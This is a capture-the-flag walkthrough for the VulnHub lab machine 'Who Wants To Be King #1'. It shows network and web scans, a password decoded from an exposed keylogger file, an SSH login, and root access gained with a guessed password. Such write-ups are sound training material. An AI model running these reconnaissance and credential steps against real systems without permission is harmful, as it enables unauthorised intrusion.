
# Who Wants To Be King #1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/who-wants-to-be-king-1,610/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.183   08:00:27:9f:1f:32      2     120  PCS Systemtechnik
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.183
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-19 19:17 -03
Nmap scan report for 192.168.1.183
Host is up (0.00032s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7f:55:2d:63:a8:86:4f:90:1f:05:3c:c9:9f:40:b3:f2 (RSA)
|   256 e9:71:11:ed:17:fa:48:06:a7:6b:5b:b6:0e:1b:11:b8 (ECDSA)
|_  256 db:74:42:c4:37:c3:ae:a0:5c:30:26:cb:1a:ef:76:52 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 31K   2020-12-01 11:23  skeylogger
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
```

### Web Analysis

```
$ nikto -h http://192.168.1.183

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.183
+ Target Hostname:    192.168.1.183
+ Target Port:        80
+ Start Time:         2020-12-19 19:19:20 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /: Directory indexing found.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /./: Directory indexing found.
+ /./: Appending '/./' to a directory allows indexing
+ OSVDB-3268: //: Directory indexing found.
+ //: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
+ OSVDB-3268: /%2e/: Directory indexing found.
+ OSVDB-576: /%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. http://www.securityfocus.com/bid/2513.
+ OSVDB-3268: ///: Directory indexing found.
+ OSVDB-119: /?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ OSVDB-119: /?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269.
+ OSVDB-3268: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
+ OSVDB-3288: ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /'s are requested.
+ 7915 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2020-12-19 19:19:40 (GMT-3) (20 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Downloading Exposed File

```
$ wget http://192.168.1.183/skeylogger

--2020-12-19 19:23:34--  http://192.168.1.183/skeylogger
Connecting to 192.168.1.183:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31416 (31K)
Saving to: ‘skeylogger’
skeylogger                    100%[===============================================>]  30.68K  --.-KB/s    in 0s      
2020-12-19 19:23:34 (79.1 MB/s) - ‘skeylogger’ saved [31416/31416]
```

### Analysing KeyLogger File

```
$ strings skeylogger | less

.
..
...
ZHJhY2FyeXMK
...
..
.
```

```
echo "ZHJhY2FyeXMK" | base64 -d
dracarys
```

### SSH Login

```
$ ssh daenerys@192.168.1.183
daenerys@192.168.1.183's password: dracarys

Last login: Tue Dec  1 11:38:40 2020 from 192.168.0.105
daenerys@osboxes:~$ id
uid=1001(daenerys) gid=1001(daenerys) groups=1001(daenerys)
```

### Daenerys User Exploration

```
daenerys@osboxes:~$ cat /home/daenerys/secret

find home, pls
```

```
daenerys@osboxes:~/.local/share$ ls -lah /home/daenerys/.local/share

total 28K
drwxr-xr-x 6 daenerys daenerys 4.0K Dec  1 11:42 .
drwxr-xr-x 3 daenerys daenerys 4.0K Dec  1 10:58 ..
-rw-rw-r-- 1 daenerys daenerys  200 Dec  1 11:13 daenerys.zip
drwx------ 7 daenerys daenerys 4.0K Dec  1 11:02 evolution
drwx------ 3 daenerys daenerys 4.0K Dec  1 11:02 flatpak
drwxr-xr-x 2 daenerys daenerys 4.0K Dec  1 10:58 gnote
drwx------ 2 daenerys daenerys 4.0K Dec  1 11:12 nano
```

### Suspicious File Analysis

```
$ scp daenerys@192.168.1.183:/home/daenerys/.local/share/daenerys.zip .
daenerys@192.168.1.183's password: dracarys
daenerys.zip                                                                        100%  200   134.2KB/s   00:00

$ unzip daenerys.zip 
Archive:  daenerys.zip
extracting: djkdsnkjdsn

$ cat djkdsnkjdsn 
/usr/share/sounds/note.txt
```

```
daenerys@osboxes:~$ cat /usr/share/sounds/note.txt
I'm khal.....
```

### Privilege Escalation

```
daenerys@osboxes:~$ su root
Password: khaldrogo

root@osboxes:/home/daenerys# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root Flag

```
root@osboxes:~# cat /root/nice.txt 

¡Congratulation!
You have a good day!
aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1nTjhZRjBZZmJFawo=
```

```
$ echo "aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1nTjhZRjBZZmJFawo=" | base64 -d
https://www.youtube.com/watch?v=gN8YF0YfbEk
```
